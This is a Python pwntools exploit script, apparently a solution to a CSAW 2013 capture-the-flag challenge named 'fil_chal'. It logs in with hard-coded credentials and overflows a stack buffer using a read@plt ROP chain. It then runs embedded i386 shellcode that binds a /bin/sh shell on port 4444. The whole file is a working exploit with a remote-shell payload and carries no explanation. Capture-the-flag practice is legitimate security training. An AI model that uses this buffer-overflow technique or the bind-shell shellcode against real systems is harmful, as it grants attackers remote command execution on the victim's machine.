from pwn import *
context(os='linux', arch='i386', log_level='DEBUG')

# If a HOST is given on the cmdline, then assume that it is already
# running there
if 'HOST' in args:
    HOST = args['HOST']
    PORT = int(args.get('PORT', 34266))
    plt_read = 0x80486e0
else:
    # Otherwise start the binary locally
    HOST = "127.0.0.1"
    PORT = 34266
    p = process('./fil_chal')
    sleep(0.5)
    binary = ELF("./fil_chal")
    plt_read = binary.plt['read']  # read@plt: call 80486e0

# Spawn netcat on 4444
SHELLCODE = \
    "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" +\
    "\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" +\
    "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" +\
    "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" +\
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" +\
    "\x0b\xcd\x80"

with remote(HOST, PORT) as r:
    r.sendlineafter('UserName: ', 'csaw2013')
    r.sendlineafter('Password: ', 'S1mplePWD')
    r.sendlineafter('Entry Info: ', '65535')

    buf = "A" * 0x420  # 1056
    buf += p32(plt_read)
    buf += p32(0x8049110)  # pop pop pop ret
    buf += p32(4)  # fd
    buf += p32(0x804b000)  # static
    buf += p32(2)
    buf += p32(0x804b000)  # static
    buf += asm(shellcraft.i386.nop()) * 100
    buf += SHELLCODE

    log.info("Sending payload:\n%s" % hexdump(buf))
    r.send(buf)
    r.send(asm('jmp esp'))  # Jump to Shellcode
    sleep(0.1)
    log.info("Done, run netcat on %s:4444" % HOST)
